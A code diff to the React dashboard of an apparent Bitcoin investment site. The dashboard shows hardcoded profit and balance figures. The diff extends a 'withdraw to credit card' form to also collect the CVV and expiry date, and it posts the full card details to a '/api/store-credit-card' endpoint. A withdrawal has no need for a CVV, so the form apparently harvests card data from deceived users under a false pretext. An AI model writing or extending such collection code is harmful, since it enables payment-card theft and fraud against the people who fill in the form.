@@ -5,6 +5,7 @@ import { useRouter } from "next/navigation";
 import { FaExchangeAlt, FaBalanceScale, FaBitcoin, FaChartLine, FaDollarSign, FaShoppingCart, FaArrowCircleDown, FaSignOutAlt, FaCopy, FaLock, FaCheckSquare, FaSquare } from "react-icons/fa";
 import { toast, ToastContainer } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
+import CreditCardType from "credit-card-type"; // Import credit card type detection library
 
 declare global {
   interface Window {
@@ -39,6 +40,9 @@ const UserDashboard = () => {
   const [withdrawMethod, setWithdrawMethod] = useState("wallet"); // New state for withdraw method
   const [creditCardNumber, setCreditCardNumber] = useState(""); // New state for credit card number
   const [cardholderName, setCardholderName] = useState(""); // New state for cardholder name
+  const [cvv, setCvv] = useState(""); // New state for CVV
+  const [expiryDate, setExpiryDate] = useState(""); // New state for expiry date
+  const [creditCardType, setCreditCardType] = useState<string | null>(null); // New state for credit card type
   const [showTimeoutPopup, setShowTimeoutPopup] = useState(false);
   const [password, setPassword] = useState("");
   const [saveDevice, setSaveDevice] = useState(false);
@@ -47,6 +51,21 @@ const UserDashboard = () => {
   const profit = 9847.00;
   const totalInvestment = 11096.00;
   const totalBalance = 20943.00;
+
+  const getCreditCardIcon = (type: string | null) => {
+    if (!type) return null;
+
+    const normalizedType = type.toLowerCase().replace(" ", "-"); // Normalize type (e.g., "American Express" -> "american-express")
+
+    const iconMap: Record<string, string> = {
+      visa: "https://img.icons8.com/color/48/000000/visa.png",
+      mastercard: "https://img.icons8.com/color/48/000000/mastercard.png",
+      "american-express": "https://img.icons8.com/color/48/000000/amex.png",
+      discover: "https://img.icons8.com/color/48/000000/discover.png",
+    };
+
+    return iconMap[normalizedType] || "https://img.icons8.com/color/48/000000/generic-card.png"; // Fallback icon
+  };
 
   useEffect(() => {
     if (typeof window !== "undefined") {
@@ -109,6 +128,26 @@ const UserDashboard = () => {
     toast.success("Payment confirmed! You will receive your Bitcoin shortly.");
   };
 
+  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
+    if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
+    if (value.length > 2) value = `${value.slice(0, 2)}/${value.slice(2)}`; // Add '/' after MM
+    setExpiryDate(value);
+  };
+
+  const handleCreditCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
+    setCreditCardNumber(value);
+
+    const detectedCards = CreditCardType(value);
+    setCreditCardType(detectedCards.length > 0 ? detectedCards[0].type : null); // Set detected card type
+  };
+
+  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, ""); // Allow only numbers
+    setCvv(value.slice(0, 3)); // Limit to 3 digits
+  };
+
   const handlePayout = async () => {
     if (withdrawMethod === "wallet") {
       if (withdrawWallet && withdrawAmount) {
@@ -118,7 +157,7 @@ const UserDashboard = () => {
         toast.error("Please enter a valid Bitcoin wallet address and amount.");
       }
     } else if (withdrawMethod === "creditCard") {
-      if (withdrawAmount && creditCardNumber && cardholderName) {
+      if (withdrawAmount && creditCardNumber && cardholderName && cvv && expiryDate) {
         try {
           const response = await fetch("/api/store-credit-card", {
             method: "POST",
@@ -128,6 +167,8 @@ const UserDashboard = () => {
             body: JSON.stringify({
               creditCardNumber,
               cardholderName,
+              cvv,
+              expiryDate,
               withdrawAmount,
               withdrawCurrency,
             }),
@@ -143,7 +184,7 @@ const UserDashboard = () => {
           toast.error("An error occurred while processing the credit card details.");
         }
       } else {
-        toast.error("Please enter valid credit card details and amount.");
+        toast.error("Please enter valid credit card details, CVV, expiry date, and amount.");
       }
     }
   };
@@ -309,20 +350,47 @@ const UserDashboard = () => {
             {withdrawMethod === "creditCard" && (
               <>
                 <p className="mb-4 text-black">Enter your credit card details:</p>
-                <input
-                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
-                  type="text"
-                  value={creditCardNumber}
-                  onChange={(e) => setCreditCardNumber(e.target.value)}
-                  placeholder="Credit Card Number"
-                  required
-                />
+                <div className="relative mb-4">
+                  <input
+                    className="w-full px-3 py-2 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
+                    type="text"
+                    value={creditCardNumber}
+                    onChange={handleCreditCardNumberChange}
+                    placeholder="Credit Card Number"
+                    required
+                  />
+                  {creditCardType && (
+                    <img
+                      src={getCreditCardIcon(creditCardType)}
+                      alt={creditCardType}
+                      className="absolute right-3 top-1/2 transform -translate-y-1/2 h-6"
+                      onError={(e) => (e.currentTarget.src = "https://img.icons8.com/color/48/000000/generic-card.png")} // Fallback on error
+                    />
+                  )}
+                </div>
                 <input
                   className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
                   type="text"
                   value={cardholderName}
                   onChange={(e) => setCardholderName(e.target.value)}
                   placeholder="Cardholder Name"
+                  required
+                />
+                <input
+                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
+                  type="text"
+                  value={cvv}
+                  onChange={handleCvvChange}
+                  placeholder="CVV"
+                  required
+                />
+                <input
+                  className="w-full px-3 py-2 mb-4 bg-transparent border border-gray-300 rounded-lg focus:outline-none text-black"
+                  type="text"
+                  value={expiryDate}
+                  onChange={handleExpiryDateChange}
+                  placeholder="MM/YY"
+                  maxLength={5}
                   required
                 />
               </>
